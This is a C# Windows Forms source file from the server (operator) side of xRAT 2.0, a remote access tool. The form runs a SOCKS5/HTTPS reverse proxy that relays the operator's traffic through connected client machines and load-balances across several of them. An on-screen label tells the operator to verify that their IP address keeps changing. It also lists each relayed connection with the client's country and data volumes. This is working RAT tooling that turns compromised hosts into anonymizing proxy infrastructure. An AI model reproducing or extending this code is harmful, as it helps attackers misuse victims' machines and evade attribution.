using System;
using System.Windows.Forms;
using xServer.Core;
using xServer.Core.ReverseProxy;
using xServer.Core.Helper;
using xServer.Core.Networking;

namespace xServer.Forms
{
    public partial class FrmReverseProxy : Form
    {
        private readonly Client[] _clients;
        private ReverseProxyServer SocksServer { get; set; }
        private delegate void Invoky();
        private ReverseProxyClient[] _openConnections;
        private Timer _refreshTimer;

        public FrmReverseProxy(Client[] clients)
        {
            InitializeComponent();
            this._clients = clients;

            foreach (Client t in clients)
                t.Value.FrmProxy = this;
        }

        private void FrmReverseProxy_Load(object sender, EventArgs e)
        {
            if (_clients.Length > 1)
            {
                this.Text = string.Format("xRAT 2.0 - Reverse Proxy [Load-Balancer is active]");

                lblLoadBalance.Text = "The Load Balancer is active, " + _clients.Length + " clients will be used as proxy\r\nKeep refreshing at www.ipchicken.com to see if your ip address will keep changing, if so, it works";

            }
            else if (_clients.Length == 1)
            {
                this.Text = string.Format("xRAT 2.0 - Reverse Proxy [{0}:{1}]", _clients[0].EndPoint.Address.ToString(), _clients[0].EndPoint.Port.ToString());

                lblLoadBalance.Text = "The Load Balancer is not active, only 1 client is used, select multiple clients to activate the load balancer";
            }
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            try
            {
                SocksServer = new ReverseProxyServer();
                SocksServer.OnConnectionEstablished += socksServer_onConnectionEstablished;
                SocksServer.OnUpdateConnection += socksServer_onUpdateConnection;
                SocksServer.StartServer(_clients, "0.0.0.0", (int)nudServerPort.Value);
                btnStart.Enabled = false;
                btnStop.Enabled = true;

                _refreshTimer = new Timer();
                _refreshTimer.Tick += RefreshTimer_Tick;
                _refreshTimer.Interval = 100;
                _refreshTimer.Start();
            }
            catch (Exception ex)
            {
                MessageBox.Show(
                    string.Format(
                        "An unexpected error occurred: {0}\n\nPlease report this as fast as possible here:\\https://github.com/MaxXor/xRAT/issues",
                        ex.Message), "", MessageBoxButtons.OK, MessageBoxIcon.Error);
                btnStop_Click(sender, null);
            }
        }

        void RefreshTimer_Tick(object sender, EventArgs e)
        {
            try
            {
                lock (SocksServer)
                {
                    this._openConnections = SocksServer.OpenConnections;
                    LvConnections.VirtualListSize = this._openConnections.Length;
                    LvConnections.Refresh();
                }
            }
            catch { }
        }

        void socksServer_onUpdateConnection(ReverseProxyClient proxyClient)
        {

        }

        void socksServer_onConnectionEstablished(ReverseProxyClient proxyClient)
        {

        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            if (_refreshTimer != null)
                _refreshTimer.Stop();
            btnStart.Enabled = true;
            btnStop.Enabled = false;
            if (SocksServer != null)
                SocksServer.Stop();

            try
            {
                SocksServer.OnConnectionEstablished -= socksServer_onConnectionEstablished;
                SocksServer.OnUpdateConnection -= socksServer_onUpdateConnection;
            }
            catch { }
        }

        private void FrmReverseProxy_FormClosing(object sender, FormClosingEventArgs e)
        {
            //Stop the proxy server if still active
            btnStop_Click(sender, null);

            for (int i = 0; i < _clients.Length; i++)
            {
                if (_clients[i].Value != null)
                    _clients[i].Value.FrmProxy = null;
            }
        }

        private void nudServerPort_ValueChanged(object sender, EventArgs e)
        {
            lblProxyInfo.Text = string.Format("Connect to this SOCKS5/HTTPS Proxy: 127.0.0.1:{0} (no user/pass)", nudServerPort.Value);
        }

        private void LvConnections_RetrieveVirtualItem(object sender, RetrieveVirtualItemEventArgs e)
        {
            lock (SocksServer)
            {
                if (e.ItemIndex < _openConnections.Length)
                {
                    ReverseProxyClient Connection = _openConnections[e.ItemIndex];

                    e.Item = new ListViewItem(new string[]
                    {
                        Connection.Client.EndPoint.ToString(),
                        Connection.Client.Value.Country,
                        Connection.TargetServer + (Connection.HostName.Length > 0 ? "    (" + Connection.HostName + ")" : ""),
                        Connection.TargetPort.ToString(),
                        Helper.GetDataSize(Connection.LengthReceived),
                        Helper.GetDataSize(Connection.LengthSended),
                        Connection.Type.ToString()
                    }) { Tag = Connection };
                }
            }
        }

        private void killConnectionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            lock (SocksServer)
            {
                if (LvConnections.SelectedIndices.Count > 0)
                {
                    //copy the list, it could happen the suddenly the items de-select
                    int[] items = new int[LvConnections.SelectedIndices.Count];
                    LvConnections.SelectedIndices.CopyTo(items, 0);

                    foreach (int index in items)
                    {
                        if (index < _openConnections.Length)
                        {
                            ReverseProxyClient connection = _openConnections[index];
                            if (connection != null)
                            {
                                connection.Disconnect();
                            }
                        }
                    }
                }
            }
        }
    }
}
